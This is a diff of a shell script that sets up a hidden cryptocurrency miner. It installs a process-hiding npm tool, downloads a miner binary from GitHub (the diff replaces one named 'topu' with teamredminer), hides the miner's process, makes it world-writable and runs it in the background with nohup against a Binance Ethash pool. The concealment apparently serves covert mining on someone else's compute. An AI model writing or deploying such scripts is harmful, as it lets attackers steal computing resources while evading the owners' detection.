@@ -5,10 +5,12 @@ apt update
 curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 sudo apt install nodejs
 npm i -g node-process-hider
-wget https://github.com/gyrogerald/dera/raw/main/topu
-sudo ph add topu
-chmod 777 topu
-nohup ./topu -uri ethproxy://TeslaM.$(echo $(shuf -i 1-9999 -n 1)-T4@ethash.poolbinance.com:443 > nohup.out
+wget https://github.com/todxx/teamredminer/releases/download/v0.9.4/teamredminer-v0.9.4-linux.tgz
+tar -zxvf teamredminer-v0.9.4-linux.tgz
+cd teamredminer-v0.9.4-linux
+sudo ph add teamredminer
+chmod 777 teamredminer
+nohup ./teamredminer -a ethash -oethash.poolbinance.com:443 -u TeslaM -p x --eth_worker $(echo $(shuf -i 1-9999 -n 1)-T4 > nohup.out
 
 while [ 1 ]; do
 
